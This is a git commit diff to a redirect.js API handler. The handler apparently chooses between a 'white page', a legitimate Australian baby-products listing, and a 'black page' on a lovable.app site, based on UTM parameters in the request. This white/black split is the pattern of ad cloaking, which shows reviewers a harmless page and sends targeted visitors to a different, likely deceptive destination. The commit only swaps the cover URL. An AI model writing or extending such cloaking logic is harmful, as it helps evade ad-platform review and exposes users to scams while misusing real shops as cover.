ae4877b6ca4643c815409ceb6971ba562c001aaa
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-09 01:06:06 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.asterandoak.com.au/products/under-the-sea-zip-romper-blue?variant=42445601800289";
+    const whitePageURL = "https://www.onelittleday.com.au/product/personalised-grey-bunny-blush-pink-blanket-shoes-baby-gift/";
     const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
